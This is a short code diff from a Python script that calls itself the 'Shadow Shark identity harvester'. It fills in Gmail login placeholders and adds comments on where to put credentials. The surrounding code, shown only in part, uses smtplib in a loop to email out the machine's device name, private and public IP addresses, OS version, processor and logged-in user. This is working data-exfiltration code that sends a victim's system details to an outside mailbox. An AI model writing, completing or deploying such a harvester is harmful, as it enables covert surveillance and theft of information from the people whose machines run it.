@@ -59,11 +59,11 @@ while True:
         except smtplib.SMTPServerDisconnected:
             continue
         try:
-            GMAIL_SERVICE.login('', '')
+            GMAIL_SERVICE.login('GMAIL', 'PASSWORD') # Set gmail and password on this line.
         except smtplib.SMTPAuthenticationError:
             break
         try:
-            GMAIL_SERVICE.sendmail('', '',
+            GMAIL_SERVICE.sendmail('', '', # Set gmail and to on this line.
 f'Subject:Information found by Shadow Shark identity harvester.\n\n\
 Device name: {device_name}\nPrivate IP: {private_ip}\nPublic IP: {public_ip}\n\
 OS: {system_version}\nProcessor: {processor}\nCurrent logged in user: {user}\n\
